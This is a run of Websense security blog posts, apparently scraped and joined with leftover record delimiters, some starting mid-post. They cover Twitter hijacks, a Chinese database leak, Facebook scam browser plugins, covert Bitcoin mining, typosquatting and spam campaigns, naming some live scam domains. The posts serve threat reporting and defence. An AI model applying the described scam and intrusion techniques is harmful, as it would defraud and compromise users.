Hundreds of thousands of clicks happened in a very short amount of time before the post was taken down. As a Security Researcher in the Websense Security Labs I’m often called upon to explain the dangers associated with these types of hacks, and how to avoid falling victim. It\'s a tough one because once an account is taken over the hacker mimics/impersonates the true owner of the account. In the Lady Gaga example the twitter hack used the nickname \"monsters\" in a rogue tweet which is a term her fans will be familiar with. Making it all the more believable. Here are some tips for staying safe while following celebrities on Twitter: # 1: Don\'t believe everything you read – if it sounds too good to be true be extra cautious clicking on that link Watch out for suspicious activity in your tweet stream and inbox. If you start seeing strange messages or your contacts are being unusually spammy, it might be that their account has been compromised, # 2: Make sure that your operating system and applications are up to date and patched Tweeted URLs may lead to exploit sites, this may happen through rogue posts on a compromised account but also through a legitimate website that got compromised. Keeping your operating system and applications up to date can protect you from a very large portion of web-based exploits used by malicious websites that are looking to take control of your computer. # 3: Use a security product for your browser Web security gateways with real-time content analysis is the level of protection businesses should use, but for home users there are free security plugins for browsers that can help, for example, mywot.com can give you a sense if you’re in the wrong place. You can also copy any URL before clicking and have Websense test it for free at aceinsight.com . # 4: Your valued data comes first Think about your the value of information you\'re giving and whom you\'re giving it to. Is the site you came to asking for valuable information? Will they keep it safe or abuse it? For example, your phone number might lead to text spam or your number registered to a premium text service just as giving your email address could lead to spam. Always read the small print of any offer and don\'t be afraid to put our researcher hat on and research any site you suspect. Again, Ace Insight is a great place to start. #5: Password information Remember, the same thing can happen to you and your social networking sites. Use different passwords, and consider using separate email accounts for your social networks. Be mindful of where you are sending your updates and the types of security questions you set. Be conscious of anything that asks you to give up your login and passwords.(for example \"fake\" tweets or an unusual direct message).

There are some interesting insights on coming trends in social media including how your social media identity may prove more valuable to cybercriminals than your credit cards....(read more)', 'https://www.forcepoint.com/insights/top-twitter-tips-celebrity-watchers\n');

One day later,Tianya, the biggest Chinese online forum, was reportedly hacked for the account information of 40 million users. This cyber attack has continued, with several well-known sites like the Duowan game, the 7k7k game, the e-commerce sites360buy and Dangdang, some popular social networking and dating sites being hacked and user data leaked. Some sites\' databases have been published on the Internet and can be easily downloaded. \nPart of the CSDN leaked database download is shown here: \n\n \nThis incident is the largest data leak ever in China. The public databases contained personal account information, including user names, passwords, and email addresses. This data leak has caused great concern among millions of Chinese \"netizens,\" especially those who use the same user name and password to access multiple Web sites. Clearly, this practice increases risk for these users, as criminals can easily use information from 1 account to log in to a user\'s other accounts to obtain even banking information. \nCSDN and Tianya have since admitted that a user account data leak occurred, but the root cause and scale of the leaks are still under investigation. Both organizations have issued public apologies to users and urged them to change their passwords immediately. They have also asked the police for help.\nA contributing factor to the severity of the data leaks is that much of the user information stored in the companies\' databases was in plain text with no encryption. CSDN has admitted that old passwords in a backup file were saved in plain text until the year 2009, when they started to encrypt all user information. Unfortunately, the plain text personal data leaked to criminals affected millions of users and will certainly raise great concerns about Web security in the future.  \nIn an analysis of this data leak, some experts conclude that it was the result of a professional hacker attack technique called \"Drag Database.\" In this technique, hackers first try to exploit the vulnerabilities of a target site. They then inject a Trojan to compromise the site and get the administrator authority to export the user database table, which they either store for future use or upload to the Internet for others to download. This underground industry can earn huge profits for hackers. \n \nThis incident taught a profound lesson to both the Internet industry and individual Internet users. Users should enhance the protection of their personal account information by setting complicated passwords that are hard to crack and changing those passwords regularly. Internet companies should strengthen their user data management, and improve security guarantees and emergency response capabilities. \nWebsense made five predictions for security trends in the year 2011, and this huge data leak exactly matched the third prediction in that list: \nPrediction #3: Status update: More corporate data breaches will occur over social media channels.                                                    \n\n    Search poisoning won’t be limited to Google, it will migrate to Facebook. Hackers will manipulate Facebook search algorithms to trick users into visiting fake brand and celebrity pages and increase exposure to malware.\n  \n  \n    Employees will post confidential corporate data to public pages.\n  \n  \n    Social media users will also be vulnerable to spam and malicious data-stealing content.\n  \n \nWebsense security products can protected customers from this kind of data leakage incidents through our DLP(Data Loss Prevention) technology and TRITON™ solutions.', 'https://www.forcepoint.com/security-labs/chinese-internet-suffers-most-serious-user-data-leak-history\n');

Websense® Threatseeker® Network recently detected some Facebook scams that now utilize the power of browser extensions to spread to other users\' profiles. Scam pages typically utilize social engineering tricks - like enticing users with videos or offers for a free voucher, all of which lure victims to take part in the scam. Now on top of that, we\'ve found that victims are also asked to install a browser plugin. The plugin is an integral part of how the scam is spread. Once installed, the plugin connects to a script that uses the Facebook API and then posts the scam to the victim\'s friends\' pages. One of the advantages of using a plugin is the ability to persist in the victim\'s browsers and propagate to other profiles - that is similar to malicious Facebook applications we\'ve seen before.\nWe have noticed that at the moment, only Chrome and Firefox plugins are used. This is how a sample scam page looks using Chrome and Firefox browsers respectively:\n\n\n \n\n \n\nThe code checks which browser is installed and serves the compatible malicious plugin. Chrome plugin files end with a CRX file extension and Firefox plugin files end with the XPI file extension. Chrome and Firefox plugin files come in a compressed form. Looking inside these malicious plugins reveals some code that loads a script from external websites. This code is ultimately loaded by the browser that connects to Facebook. The code posts in the victim\'s name on the victim\'s friends pages, which results in the victim further spreading the scam, spam, and possibly malware. To see the code behind the plugin of the scam shown above, take a look at these next images:   \n\n \nHere is another example of a scam with the same concept.

The generation of Bitcoin currency is controlled by an algorithm created by Japanese researcher Satoshi Nakamoto in 2008. Bitcoin system users are essentially \"mining\" for Bitcoins using their computers CPU power. Today, because of the intrinsic characteristics of the Bitcoin-generating algorithm, calculating new \"coins\" in a reasonable amount of time without the use of distributed computing power is very difficult. It\'s important to remember that Bitcoins are like real money and can be exchanged for real money. \nDuring a recent investigation, we encountered a new trend in the landscape of monetization techniques which can be triggered by the Black Hat SEO (BHSEO) poisoning campaign. What happens when BHSEO specialists meet a service offered, for example, by BitcoinPlus which is used for mining Bitcoins? Well, we should never underestimate the cleverness and the imagination of cyber criminals.  Specifically, we have encountered the presence of an array of Websites that have been setup for BHSEO purposes and that are used for Bitcoin mining.  \nBasically, this is the goal of BHSEO poisoning: reach a user for malicious purposes when that user is looking for something via a search engine.There are many ways to create a BHSEO campaign (or structure). The one most often used consists of creating and renaming a Website HTML page to be a popular keyword. So a global celebrity gossip news item can be a gold mine for anyone who wants to build a BHSEO campaign. This technique is frequently used to spread malware or some other kind of malicious content. \nBitcoinPlus offers a service  which allows a registered user to mine \"coins\" using some JavaScript that is added to their Website. This essentially means that the computer\'s CPU power of any visitor of such Website will be used to generate Bitcoins for the Bitcoin account owner. \n\n \nThe code, provided by BitCoinPlus, is shown in the following screen shot, this is the code that is included in the BHSEO Website to generate Bitcoins:\n\n \nEssentially the code requires the support of the minimal jQuery library, the call to the mining JavaScript code, and the registration of the BitcoinPlus user account. The following Java applet shows the miner.js call:\n\n \nA brief analysis of this JAR file shows the code that calculates the amount of time necessary for any Web client visit to mine Bitcoins, as shown in the following code snippet: \n\n \nUp to this point, nothing illegal has happened.  But what would happen if this script is used for malicious intent? During our analysis using the Websense ThreatSeeker ™ Network, we detected several Websites setup with the JavaScript snippet shown above. The screenshot below shows some of the Websites that are part of the BHSEO campaign, explained earlier in this blog:  \n\n \n\nThe keywords relate to a variety of topics: adult content, electronic devices, hacking, software, and so on.  We tried to load one of the Web links detected, and the HTML page appeared to display the information that a user might expect. At this point, an array of squares appeared, and took some time to download completely. (Remember that a Bitcoin user would already be logged in and using the BitCoinPlus services to mine Bitcoins.)\n\n \n\nOnce the content of the squares is loaded, another download begins (again a time-consuming activity and delaying tactic to permit the \"mining\" of the Bitcoins the user has collected). \n\n \n\nA user who clicks the black square (to download the \"required video player\") actually downloads a rogue player. The user counter offered by Among.Us (the red square on the left with the number 135) indicates an average of 140 users per hour for this Website.\n\n \nIf we examine the user counts in the Among.US counter over time, we can see peak counts of up to 490 users for the Website we analyzed. \n\n \n\nOne reason that such a large number of visitors can be accommodated could be the use of an automated system (maybe a botnet) to easily create a monetization process with click-jacking activities. The \"coins\" mined from unsuspecting users are just like real money and can be used for other frauds and malicious activities. This type of cyber fraud could become a larger issue, and difficult to explain in just one blog post. \nAt this time, the script in the Web page we analyzed is commented. However, via ThreatSeeker we have detected about 10000 URLs where the injected script seems to be active. Many of these URLs are related to Web and email spam and malicious Web sites and reside in low reputation autonomous systems, as shown in the following results: \n\n \nRecently, we discovered some binary bots created ad hoc to steal the Bitcoin wallets from infected systems. Although Bitcoin mining is not malicious by itself, we can see that the practice can be used to entice users to visit pages that do not contain the contents they were looking for, which could be considered fraudulent activity.\n \nWebsense customers are protected from these threats by ACE, our Advanced Classification Engine.', 'https://www.forcepoint.com/security-labs/bitcoin-miner-black-hat-seo-poisoning-campaign\n');

I was recently in St. Louis speaking with a group of CISOs about how they are preparing for 2012. Right now, many companies are meeting to discuss how to allocate budget and resources for the new year. Often it also means discussing what went well and what didn’t.\nThe resounding theme in my discussion with other CISOs was that the board of directors, for the first time, is really interested in making sure their company is secure. Many CISOs are getting questions specifically about whether they are protected from targeted attacks, malware, and data breaches. And many of these questions are coming from people who don’t really know what terms like “targeted attack” or “malware” actually mean. This trend tracks to our recent Security Pros & ‘Cons’ research. We found that 91% of IT security managers report that new levels of management have engaged in data security conversations in the last year.\nSo, how should you speak to your board of directors about threats and security?\n1.     Keep it simple.\nAvoid industry or technology jargon. If they want more technical details, try explaining it to them as if they were a member of your family. While your board members are very smart, they do not have the technical knowledge you do. You are the IT security expert and need to communicate in terms they understand. This often means equating security to dollars and cents. Or as I often refer to it, “dollars and sense.” \n2.     Use images and numbers.\nYour board of directors understands numbers. Set the scene with stats, like at “any given time our employees are only two clicks away from a malicious website.” Tell them you stopped XX attacks, XX pieces of confidential data from being stolen/misused, and implemented XX new programs designed to keep the network safe.\nI also encourage you to use images. Work with your marketing team to create a mash-up of your web security tools and a spinning globe of the earth. Show a storm cloud advancing over certain cities where your employees are. It will show your board members where the threat is the highest. There is no doubt your board will ask: \"Are you 100% sure you won’t be hacked?\" You can reply that while you can’t stop the rain from falling—the company needs to be prepared for the storm and needs to have the proper tools in place to reduce the damage.\n3.     Repeat yourself often and in an interesting way.\nYou need to repeat your message multiple times for someone to remember it. So before you get into a board meeting, write out one short sentence that captures what you want the board to walk away with. For example, “We are protected from cybercriminals” OR “We need more funding for IT security or we will get breached.”\nRepeat this message at least three times throughout the presentation. Don’t do it in succession (because you will sound a bit nuts), but constantly.\nYour communication repetition also needs to extend beyond the board room. You need to communicate on a regular basis with management about your successes or needs. The only time they hear from you can’t be when you need funding or once a year. Once a quarter is the bare minimum—and once a month is ideal.\nHere’s a great CSO article on the 9 secrets to getting stuff done in a company. Many of my tips are included in here, as well as insight from other top CISOs in the industry. Also, be sure to check out the Websense Security Labs 2012 predictions.

This time, we\'re going to give an actual example of typosquat hosts found in the wild and show how typosquatting scams work. We\'ll take you through a typosquatting campaign that abuses tenth of known brands and includes thousands of registered typosquat hosts (a typosquat hive). After that, we\'ll offer a list that includes hundreds of typosquatting hosts from that hive, all of which can be found in the wild. The list is free to download for any of you who are into IT security -- so this Xmas can be a bit safer.\n  \n \nIn this blog we\'ll cover:\n- A typosquatting example: If you make the wrong typo, where will it take you, and how does it work?\n  - A typosquat hive example from the wild - how does it work, which brands are targeted, and where will the typosquat take you?\n  - Which countries the typos are coming from with this campaign.\n  - Where the scam infrastructure is located. \n  - A list of hundreds of hosts used for typosquatting found in the wild. The list is free to download.\n \n  A typosquatting example: If you make the wrong typo, where does it take you?  \n  We\'ve all made typing mistakes when typing a Web address in our browser. In better cases, we get nothing more than a 404 not found error. In worse cases, we might be redirected to a scam site or a malware/exploit site.  \n  Usually, in the case of typosquatting-based cyber crimes, the victim that mistakenly made the typo is redirected to a scam site that tries to take advantage of the victim\'s state of mind. For example, victims who thought they typed in the right Web address might not notice if they see a scam site with the look and behavior that they expect, and that can profit the scammer. Victims might see a site with the same color scheme and theme as the brand or site they intended to go to, hand-in-hand with false congratulations on being a random winner who will receive a prize for completing a short survey. The following video shows how it works:\n  \n    \n      \n\n     \n  A \"typosquat hive\" example from the wild: How does it work?  \n  Typosquatting is illegal in the US. Nonetheless, a lot of typosquatting sites are hosted in the US. As an example, at the bottom of this blog, you\'ll find a list of hundreds of hosts that are part of a typosquat hive (the hive itself contains thousands of hosts), and all of them are hosted in the US. We call it a hive because all of the listed hosts have a connection, and were most likely set up by the same cybercriminals.  \n  How does this specific scam work? Please refer to the image below, and we\'ll take you step-by-step right through it. The typosquat hive (marked 1 in the diagram ) consists of many hostnames registered by the cybercriminals. (If you have a look through the list linked at the bottom of the blog, you\'ll find those names there.) The list consists of a lot of names that target very well known brands. The cybercriminals are interested in breadth -- they want to target as many well-known brands as possible. This gives their scam good exposure. The cybercriminals that are in control of the hive (the registered typosquat domains) have a few options for how to use the sites. They can set up their own scam infrastructure, like the premium rate phone numbers system we saw in the video above. Usually, the cybercriminals that own the hive partner with other cybercriminals that already have the scam infrastructure established (marked 2). The scam infrastructure is where the victim (marked 3) is ultimately led to separate from his or her money after making a typo in the browser. The scam infrastructure consists of Web servers, changing domain names, and the enticing scam content that victims see. \n  The agreement between the cybercriminals that own the hive and the ones that own the network could be either fixed cost for the time the typosquat hive is used, or, more often, a \"per traffic\" agreement. The latter means the owner of the hive gets a cut based on the actual number of victims that fall for the scam. For example, a percentage from the victims that registered for a premium number text service that costs £3 a message. Once the agreement is set up, the owners of the hive can point the hosts they own to the name servers that are part of the infrastructure built by their \"partner in scam\" (marked 4) for as long as the agreement is on.  \n  The typosquat hive in our example targets mainly UK brands (list available for download at the end of the blog). Here are just a few examples from that list of registered typosquatting domains in the hive, including the brands they\'re targeting:\n   \n  johnlwis.com (targets the legitimate Web site johnlewis.com)\n  arrgos.co.uk (targets the legitimate Web site argos.co.uk)\n  debnhams.co.uk (targets the legitimate Web site debenhams.com)\n   \n  As UK Web sites and brands are the main target, most of the requests coming to this typosquat hive originate from the UK (victims making easy typos). Please refer to the pie chart below to see the location distribution of users that end up at a typosquat host in this hive, as observed in the Threatseeker™ Network over one week. It\'s natural to see multiple countries, as UK residents roam and brands offer services and products that are available globally.\n\n   \n\n  \n \n  The scam infrastructure is hosted in the US  \n  Typos that go to a host in the hive lead to a scam site. For example, when this blog post was created, typing in johnlews.com redirected any victim to the scam site surveystartweb.com as seen in the diagram below (click to enlarge). Much as in the scam featured in the video, victims are informed that they won a desirable product, and are asked to register to a premium rate number service (click on the second image to see an animation of the redirection in the browser).  \n  \n \n  Animated GIF showing the redirection to the scam site after making the typo (click to open - the animation loops):  \n  \n   \n  In this example, surveystartweb.com is part of the scam infrastructure and ultimately redirects to promotions.djummer.com, where victims are likely to be separated from their money. The scam infrastructure consists of many hosts that hold basically the same information. In essence, different typos lead to different scam hosts and URLs that usually follow the same principal, as in this case where victims are led to a premium rate number service. Using the Threatseeker Network, it is possible to check how many unique scam URLs are identified as part of the same scam infrastructure. If you check the graph below, you can see that observing live data for a week yielded an average of 121 unique URLs per day.\n \n  The GeoIP location of the URLs within the scam infrastructure is mainly in the US, a fact we found astounding. Check out the pie chart below to see the GeoIP location distribution of all the hosts known to be part of the scam infrastructure, as observed by the Threatseeker Network over one week.  \n  \n   \n  \n   \n  Some final words\n\n  It\'s important to note that good typosquat hosts are very valuable to their cybercriminal owners. There are two main reason for this:\n \n  1. A good combination of keys both likely to be a common typo and very similar to the legitimate, targeted site is rare. There are a limited number of proximate keyboard buttons that are likely to create a typo: for example, instead of the letter \"P,\" it is easy to type nearby letters like \"O.\"  \n  2. Once a typosquat domain is spotted, it\'s blacklisted and lost forever.  \n  For these reasons, it\'s not a surprise to see typosquat hosts that don\'t serve scams lying low for a time, coming to life and serving scams for a short while, and then going back to covert mode. Also, it\'s common for typosquat hosts to employ evasion tactics while they lie low; one method is to redirect any users or nosy researchers to the legitimate Web site to avoid any suspicion. Other tactics could involve blacklisting methods against probing users or researchers that try to poke around the hive.  \n  It\'s important to remember that legitimate Web sites and the companies behind them sometimes employ a strategy of buying typosquat hosts that are similar to their site\'s name. This is a good strategy for successful Web sites, as those companies usually understand the dangers of typosquatting and how their brand name can be affected and abused. Kudos go to Amazon, which registered a good number of potential typosquat hosts, including aqmazon.com, amaxzon.com, amzon.com, and many more. These are all GOOD hosts registered by Amazon itself, leaving no chance for abuse as long as they remain registered to Amazon.   \n  We\'d also like to add that other means can be used to redirect or lure victims to the scam infrastructure. For example, not long ago we also noticed that a spammy Facebook campaign titled \"In Memory of Steve Giving Away 1000 iPad 2s\" that propagated throughout Facebook and ultimately led victims to the same infrastructure. \n \n  A list of hundreds of hosts used for typosquatting found in the wild and free to download.  \n  Download the full list from here 3324.typo_list_.txt. Please exercise CAUTION as these domains aren\'t safe. We strongly advise that you not load them in a browser.', 'https://www.forcepoint.com/security-labs/typosquat-hostname-list-xmas\n');

Yet to really fit the image in the Droid commercial, the sizeable interest in guns should have been refined into an interest in daggers and exploding ninja stars (however, at Websense we don\'t have a special category for that).\n  We study the nature of the mobile apps our customers use and the security risks they pose, and the open nature of Android development has proven that there is more risk. Anybody can take a legitimate Android app and repackage it with malware. The average person will not be able to tell the difference until it\'s too late. When we study where customers are really getting their apps, once again, you can see that the Android users are living dangerously.

Websense Security Labs™ has written several blogs before about similar cases.  I just want to point out that such emails are still being sent in bulk and are still being used as a vector to infect end users\' computers. The reason why these kinds of emails are still so popular is because the attachments are being repacked for every new campaign; therefore, antivirus products struggle to release new signatures for those and are unable to block them, like in this case. The campaign is known, but VT shows only 8/42 results for an attachment. \n \n4. test \n\n \nThis email suggests that the attachment is a patch for WoW (World of Warcraft). Unfortunately, for the criminals, the archive is corrupt and therefore harmless to the recipients. Emails with \"test\" in the Subject line are commonly used by criminals to spread their malicious software. Users are used to seeing legitimate emails with \"test\" in the Subject line when an email system is being checked,  and also spammers use such techniques to validate an email address.\n \n5. Payment/TAX systems:\nFRAUD ALERT for ACH\n  Your Wire Transfer\n  Wire transfer rejected\n  IRS requires new EIN\n  IRS Tax report \n\nThis type of email appeared in August-September 2011.

Given the role of the internet in the recent Arab Spring uprisings, it is little wonder why repressive regimes seek to stifle online education and communication that they see as threatening.\nIs it appropriate for American businesses to claim that technology is morally neutral, and therefore absolve themselves of responsibility for its use? \nNo. American software companies should take strong measures to prevent the misuse of their technologies where it would be harmful to the public good. And it’s long overdue for American technology companies to step forward and address this problem.\nWebsense is a world leader in protecting corporate data, and has for years also been the world leader in web filtering, a type of software that allows organizations to choose what web content is permissible for their employees to access in the workplace.  Websense does not support the use of our software for the purposes of government censorship and Websense does not sell to governments for the purposes of censorship.\nTo illustrate, several years ago a Yemeni internet service provider purchased Websense filtering software from a third party and pirated it to censor Yemeni citizens. When Websense learned of the pirated software being used for censorship, we disabled it, preventing the Yemeni ISP from continuing to misuse and abuse Websense software. This business would have been 100% legal for Websense to pursue; yet we took the moral and ethical stand to cede that business to the competition.  And just last month, we detected—and blocked—two attempts to use our software using cloaked addresses in Europe that were actually fronts for entities in Syria, a country subject to trade sanctions by the United States. This is not rocket science, but it does take some moral fiber, smart people, commitment, and follow-through.\nWebsense has been highly transparent in our position on censorship and the full text of our anti-censorship policy is publicly available to all of our customers and competitors on our website.  But instead of being a lone voice for this cause, we are issuing a call to action to the industry and stakeholders. We challenge all other American technology vendors to join us in prohibiting repressive regimes from using American technology to prevent open communications. As a U.S. organization, based in a country founded on the right of free speech, we believe that other companies should adopt ethical policies and technical measures that prevent their software and products from being used to restrict the communications freedoms that the internet affords every global citizen.\n Technology can be both empowering and repressive. Families and communities grow, prosper, and share information online. Yet, repressive regimes suppress these voices by blocking access to content they perceive as unsettling or threatening. \nIf you are a shareholder of a U.S. technology company, write to your leaders. If you are a citizen concerned with this issue, reach out to the companies that make these types of software and ask that they adopt a non-censorship policy similar to Websense. Reach out to organizations like the Open Net Initiative and the Electronic Frontier Foundation to ensure that they get the story right and understand how you can support ongoing, free discourse throughout the globe.\nIf you are an executive at a security company that makes software that can be used to censor internet activity in repressive regimes, we ask that you support the right course of action and stop selling repressive tools to oppressive regimes.', 'https://www.forcepoint.com/insights/websense-statement-improper-use-technology-suppression-rights-and-violation-trade-sanctions\n');

Websense fully supports its integrated product versions and has an open offer to Blue Coat executives to integrate its real-time defenses to increase the security effectiveness provided to joint customers.\nThe ‘net-net’ is that Blue Coat, at its sole discretion, decided to end support for Websense, thus removing the option for customers to protect their networks with market-leading Websense® web filtering. The Websense solution is backed by the Websense ThreatSeeker® Network, which is now linked into Facebook and its more than 800 million users, plus the Advanced Classification Engine (ACE) with its multiple defenses and real-time composite scoring to detect advanced threats and stop data-stealing attacks.\nOver the years, Blue Coat has been challenged to develop product solutions on two fronts, one being web security and the other WAN optimization. Resources at Blue Coat are limited, and trade-offs have to be considered: Blue Coat had seven product releases over the past five years, and they were focused on WAN optimization, not security.\nSecurity advancements in ProxySG and the underlying operating system SGOS have been few, if any, per-product release cycles during these years, including the most recent release v6.2. An example of trade- offs includes changing SGOS v5.x to allow non-compliant protocol traffic by default to make WAN optimization deployments easier at the expense of security. The other side of release cycles is software testing, and that can be a major bottleneck and delay in time to market (even more so when building WAN optimization into a web proxy). In order for Blue Coat to sustain advancements in ProxySG for web security, they have to try to do more with less.\nRemoving custom SDKs that support market-leading web filtering is one way to accomplish this objective at an expense to customers. The result for Blue Coat appears to be less code, less testing, less functionality, fewer support issues, and faster time to market for a release cycle. For an organization facing  escalating feature requests from customers and declining rankings in analyst quadrants, they are faced with cutting back to the basics and trying to move forward.

So, it’s not about building the biggest wall, it is about getting smarter.\nWhat are the biggest emerging threat surfaces and are you prepared to deal with these threats? Do you have a mobile security strategy? a data security strategy; a cloud strategy? Overall it seems many companies are not prepared for emerging threats, for example, I’ve seen poll numbers of Fortune 1000s where:\nApproximately 12 percent said they had a cloud security strategy in place\n  Only eight percent had a defined strategy in place for protecting iDevices and Androids\n  And only 16 percent felt prepared for the current bring your own computer trend\nIn other words, we need to look beyond what to do when a breach occurs, and also look at how we are going to create and deploy strategies that help prevent them from reccurring. If we are stuck to reacting to breaches, we are doomed to fail.\nThese are the sorts of things I’ve been talking to a lot of senior security leadership about lately. Tools are tools. Strategy that addresses future and emerging trends and threat surfaces is what is going to help us protect our organizations. Feel free to drop me an email or add a comment below if you’d like to talk about some of the most successful strategies I’m encountering when I’m speaking to these top companies.', 'https://www.forcepoint.com/insights/wsj-what-do-if-you%E2%80%99ve-been-hacked-my-take-how-do-you-prevent-it-recurring\n');

The new challenge is the surprising rate at which it is evolving and the fact that it is seen now as a freight train that IT can’t stop—and shouldn’t try stopping.\nMarketing uses Facebook and Twitter. HR uses LinkedIn. Even customer support is looking at Twitter. And a new generation of workers can’t seem to live without constantly being connected—an expectation they bring to work with them. I’ve even had a CSO come out and say, “Even in a tough job market, my CEO says we need to do everything we can to get the best candidates out there. That means access to social media and the innovations that come with it. Basically they told me to make it happen AND keep us safe.”\nWe’ve been working on things to keep organizations safe on the social web for ages, but it helps to check in with the world every now and then to make sure we are on the right track in allowing safe access to social media.\nWith that in mind, we teamed with the Ponemon Institute to assess the social media readiness and risk profile of more than 4,000 IT and IT security practitioners around the globe, and what we found is a little surprising.\n\n\n  \n\nMost respondents agree that the use of social media in the workplace is important to achieving business objectives. However, they also believe that these tools put their organizations at risk. In fact, the research provides evidence that many organizations are lacking the right strategy to address the risks posed by social media tools in the workplace. Key findings include:\nThis increase in social media attacks is catching many organizations off guard. 63 percent agree that employee use of social media puts their organizations’ security at risk. Only 29 percent of more than 4,000 respondents in 12 countries said that their organizations have necessary social media security controls. \nMalware attacks have increased because of social media usage. Fifty-two percent of organizations experienced an increase in malware attacks as a result of employees’ use of social media. The United States, United Kingdom, Brazil, Germany, and Singapore report the highest increase.\nOrganizations believe that productivity has declined and IT bandwidth has been diminished as a result of social media use. The top two negative consequences of an increase in social media use were diminished productivity (89 percent) and reduced IT bandwidth (77 percent), which increase costs\nThis survey is the first time I’ve seen a number put to the increase in malware specifically due to social media. We know from our Security Labs alerts how frequently the latest in scams and attacks over the social web occur. I think it’s only a matter of time before that accelerates, as social media is further combined with social engineering and the bad guys start pulling data out from the organization through the open door of social media.\nWith rich media and lots of dynamic content on the web, you can understand why productivity and bandwidth are other top issues.\nTime quotas, bandwidth management and coaching users through alerts is the area between block and allow policies that allows social media with reasonable controls. Add in real-time defenses and data theft protection, and an organization can safely use the social Web.\nThat way, your users, who carry with them a certain expectation of access, can get on the social web but you can use a time quota system to ensure employees remain productive throughout the day.\nYou can find the full survey results here.\nWe’ve also got a great infographic that illustrates many of the findings from the research survey.\n2313.SocialMediaResearch_Infographic_WS copy.pdf', 'https://www.forcepoint.com/insights/new-research-social-media-and-social-threats-hand-hand\n');

These are the largest changes to Facebook since the early beginnings of the site. \nTheir newly released features are:\nA redo of their Friends Lists (like Google+ Circles) to make it easier to share with whom you want\n  A real-time news ticker (same functionality as RSS feeds)\n  The option to subscribe to anyone, whether that person is among your friends or not. (similar to Twitter)\nTimeline\nIn a few weeks, Facebook is launching “Timeline,” thereby giving the site an entirely new interface.\nTimeline will let you customize your personal life story. It’s based on your account activity and will be organized in reverse chronological order. You decide what you want to include in your story from old postings, pictures, and such. And you can show your favorites in double size if you want. \n  You will also have the ability to go back in time and fill in the blanks for important milestones that were not posted on Facebook (or that happened before Facebook even existed).\nWhen you start out with Timeline, you\'ll have the option to immediately publish, or wait until you have edited your story. Just be aware that Facebook will set a deadline for all profiles that you can publish in Timeline.\n                                    \nReal-time media sharing\nIn the past, you would have clicked the “like” button to show everybody that you like a song. With the new interface on Facebook, you no longer need to do this. We are now talking about “passive sharing,” and by default, much of what you do with Facebook apps and even outside of Facebook with their integrated partners such as Netflix, Internet Games, and Yahoo News will automatically be shared. \n  Example: You can listen to a song on Spotify and Facebook will know and post this in your Timeline.\n\n  Now one issue here is that your friends will know every single song that you listen to on Spotify and every movie you watch on Netflix, and you will know the same about them. \n   \n  In some ways, it resembles Beacon, a Facebook project in which sites like Amazon automatically posted to Facebook when and what a user purchased. This initiative failed in 2007 after protests from the public about the lack of privacy controls.\n               \nPossible logout risk\nFacebook recommends that you log out of their site before browsing other sites if you are worried about them picking up your online activity. Hacker Nik Cubrilovic claims that this may not be enough. He says when logging out of Facebook, their cookies are not removed but merely altered.\n\n  “A number of cookies - including your account number - are still sent along to all requests to facebook.com,” Cubrilovic explains in his blog post. “Even if you are logged out, Facebook still knows and can track every page you visit … The only solution to Facebook not knowing who you are is to delete all Facebook cookies.\"\n\n  Cubrilovic adds that this applies to any site with a Facebook “like” or “share” button or any other widget.\n\nConclusion\nThrough the use of Timeline, users will be able to participate in and build a stronger social Web experience by sharing their entire life story and exposing that information to an even wider audience. Real-time media sharing will let users get a look at each other\'s song and media choices in real time.\nWe\'re interested to know what you think of the new Facebook. Please leave comments at the bottom of this blog.\n \nThank you! \n  Elisabeth Olsen - Supervisor Websense Labs', 'https://www.forcepoint.com/security-labs/did-you-hear-about-new-facebook-changes\n');

Initially these accounts were on hosted freemail providers, but externally facing corporate webmail accounts have recently been targeted. The technique is the same in both attack scenarios: Account passwords are either phished or subjected to a brute force password attack. Once an account is compromised, the attacker can send email messages to contacts and other addresses using the compromised company\'s reputation to avoid detection by spam filters. \nRecently we have detected a disturbing shift in this trend, with email marketing organization web accounts being compromised and used to send spam, which often contains malicious links. \nBelow is an example of spoofed email originally sent from an email marketing company based in Argentina. In this case, the account belongs to a large electrical retailer who has both online and store-front outlets. \n\n \nWe can validate that this email came from the email marketing company\'s infrastructure using the Sender Policy Framework (SPF) records published for its domain. \nThe account was used to send out spoofed email that appears to originate with an international clothing retailer. However, some of the links in the email direct the recipient to a similarly named domain ‘<companydomain>-billings.com’, which was registered on the day of the attack. This site hosts a zip file containing a malicious fake invoice named ‘<companyname>_Order_16YWBoG.exe’. At the time this email campaign started, this file had 0% coverage by the AV community. \nThe day after the first email messages were sent, the attacker compromised another account on the same Argentinian email marketing company website, this time registering a new domain ‘<companydomain>-support.com’. On the third day, the attacker switched to an email marketing company based in Australia. As before, they registered a new domain, but instead of including this domain ‘<companydomain>-invoice.com’ in the email, they compromised an Australian travel company\'s website and used it as a redirector. This travel company owned the Australian email marketing company account that was used to send the spoofed email. The additional step was probably taken to avoid basic outbound email filtering by the marketing company.\n \nOne thing these marketing companies have in common is that they appear to include their account names in the user part of the email address combined with their own domain. This makes it very easy for an attacker to subscribe to a newsletter and receive account and marketing website details.\n\n \nAs more companies use third-party email marketing organizations to handle their commercial email requirements, are they inadvertently risking their reputations and the repeat business of their loyal customers? We think they could be.\nMost email marketing web accounts require basic password authentication. If an account is compromised, the attacker has access not only to an efficient email sending infrastructure and campaign editing tools, but also customer email details too. Even worse, most of the major email marketing companies also integrate with many online CRM services, giving the attacker the additional option to resell an organization\'s information to its competitors. So to the attacker these marketing companies represent soft and potentially lucrative targets.\nSo when your email marketing account is created, does it meet your company\'s password policy? Does your marketing department share this accoun t and leave the password posted on the pin board? Remember: A simple password may be all that is stopping your organization from sending your entire customer base a malicious email.', 'https://www.forcepoint.com/security-labs/compromised-email-marketing-companies-sending-spam\n');

